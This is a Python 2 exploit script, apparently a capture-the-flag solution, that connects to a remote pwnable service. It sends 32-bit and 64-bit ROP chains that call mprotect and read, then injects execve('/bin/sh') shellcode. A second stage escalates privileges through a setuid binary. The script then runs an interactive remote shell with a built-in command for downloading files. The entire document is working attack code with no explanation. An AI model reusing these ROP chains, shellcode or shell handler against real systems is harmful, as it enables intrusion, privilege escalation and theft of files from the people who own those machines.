#!/usr/bin/env python
from struct import *
import sys
import socket
from time import sleep

rhp     = ("pwnable.katsudon.org",33201)

nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(0.5)
nc.connect(rhp)
print 'Connect to %s:%d' % rhp

#==========Stage1==========#

def stage1(nc):
    print 'Stage1'
    
    addr_ret        = 0x080484fd
    addr_pop_0xc    = 0x08048312
    addr_mprotect   = 0x08048330
    addr_read       = 0x08048340
    addr_mem_exec   = 0x20000000

    stdin  = 0x0
    length = 0x400


    exploit =   pack("<I", addr_ret)
    exploit +=  "\x00"*0xc
    exploit +=  pack("<I", addr_mprotect)
    exploit +=  pack("<I", addr_pop_0xc)
    exploit +=  pack("<I", addr_mem_exec)
    exploit +=  pack("<I", length)
    exploit +=  pack("<I", 0x7)
    exploit +=  pack("<I", addr_read)
    exploit +=  pack("<I", addr_mem_exec)
    exploit +=  pack("<I", stdin)
    exploit +=  pack("<I", addr_mem_exec)
    exploit +=  pack("<I", length)

    payload =   "\x31\xc0"                  #xor    %eax,%eax
    payload +=  "\xb0\x0b"                  #mov    0x0b,%al
    payload +=  "\x68\x2f\x2f\x73\x68"      #push   0x68732f2f
    payload +=  "\x68\x2f\x62\x69\x6e"      #push   0x6e69622f
    payload +=  "\x89\xe3"                  #mov    %esp,%ebx
    payload +=  "\x31\xc9"                  #xor    %ecx,%ecx
    payload +=  "\x31\xd2"                  #xor    %edx,%edx
    payload +=  "\xcd\x80"                  #int    0x80

    print 'Send exploit...'
    nc.sendall(exploit)
    print 'Send payload...'
    nc.sendall(payload)

#==========Stage2==========#

def stage2(nc):
    print 'Stage2'
    
    addr_ret        = 0x0040062c
    addr_pop_rsi_1  = 0x00400691
    addr_pop_rdi    = 0x00400693
    addr_pop_1      = 0x00400692
    addr_mov_rdx    = 0x00400670    #mov r13,rdx    mov %r14,%rsi
                                    #mov %r15d,%edi callq *(%r12,%rbx,8)
    addr_pop_6      = 0x0040068a    #pop rbx,rbp,r12,r13,r14,r15
    addr_mprotect   = 0x004004c0
    addr_read       = 0x00400490
    addr_mem_exec   = 0x20000000
    addr_buf        = 0x00601100

    stdin  = 0x0
    length = 0x400


    exploit =   pack("<Q", addr_ret)
    exploit +=  "\x00"*0x8

    exploit +=  pack("<Q", addr_pop_rdi)
    exploit +=  pack("<Q", stdin)
    exploit +=  pack("<Q", addr_pop_rsi_1)
    exploit +=  pack("<Q", addr_buf)
    exploit +=  pack("<Q", 0xdeadbeef)
    exploit +=  pack("<Q", addr_read)

    exploit +=  pack("<Q", addr_pop_6)
    exploit +=  pack("<Q", 0x0)
    exploit +=  pack("<Q", 0x0)
    exploit +=  pack("<Q", addr_buf)
    exploit +=  pack("<Q", 0x7)
    exploit +=  pack("<Q", length)
    exploit +=  pack("<Q", addr_mem_exec)
    exploit +=  pack("<Q", addr_mov_rdx)
    
    exploit +=  pack("<Q", addr_mprotect)

    exploit +=  pack("<Q", addr_pop_6)
    exploit +=  pack("<Q", 0x0)
    exploit +=  pack("<Q", 0x0)
    exploit +=  pack("<Q", addr_buf)
    exploit +=  pack("<Q", length)
    exploit +=  pack("<Q", addr_mem_exec)
    exploit +=  pack("<Q", stdin)
    exploit +=  pack("<Q", addr_mov_rdx)
    
    exploit +=  pack("<Q", addr_read)

    exploit +=  pack("<Q", addr_mem_exec)


    payload =   "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  #movabs '/bin/sh',%rbx
    payload +=  "\x53"                                      #push   %rbx
    payload +=  "\x48\x89\xe7"                              #mov    %rsp,%rdi
    payload +=  "\x48\x31\xf6"                              #xor    %rsi,%rsi
    payload +=  "\x48\x31\xd2"                              #xor    %rdx,%rdx
    payload +=  "\x48\x31\xc0"                              #xor    %rax,%rax
    payload +=  "\xb0\x3b"                                  #mov    0x3b,%al
    payload +=  "\x0f\x05"                                  #syscall


    nc.sendall('./shellcodeme2\x0a')
    print 'Send exploit...'
    nc.sendall(exploit)
    sleep(1)
    nc.sendall(pack("<Q", addr_pop_1))
    print 'Send payload...'
    nc.sendall(payload)

#==========

def shell(cmd):
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")
        
    rsp = ""
    try:
        while True:
            rsp += nc.recv(1024)
    except:
        True
    finally:
        return rsp

if __name__=='__main__':
    shlvl=1
    stage1(nc)
    
    sleep(1)
    whoami = shell('id').split('(')[3].split(')')[0]
    hostname = shell('hostname').split('\n')[0]
    pwd = shell('pwd').split('\n')[0]
    while True:
        cmd = raw_input('[%s@%s %s]$ ' % (whoami,hostname,pwd))
        if cmd.split(' ')[0]=='GET':
            fname = cmd.split(' ')[1]
            data = shell('cat %s' % fname)
            if len(data)>0:
                open(fname.split('/')[-1],'wb').write(data)
                print '"%s" download succeeded!' % fname
            else:
                print 'download failed...'
                 
        elif cmd.split(' ')[0]=='su':
            stage2(nc)
            sleep(1)
            whoami = shell('id').split('(')[3].split(')')[0]
            shlvl += 1
        elif cmd.split(' ')[0]=='cd':
            shell(cmd)
            pwd = shell('pwd')[:-1]
        elif cmd.split(' ')[0]=='exit':
            nc.sendall("exit\x0a")
            if shlvl==1:
                break
            else:
                whoami = shell('id').split('(')[3].split(')')[0]
                shlvl -= 1
        else:
            print shell(cmd)
    
nc.close()

#==========
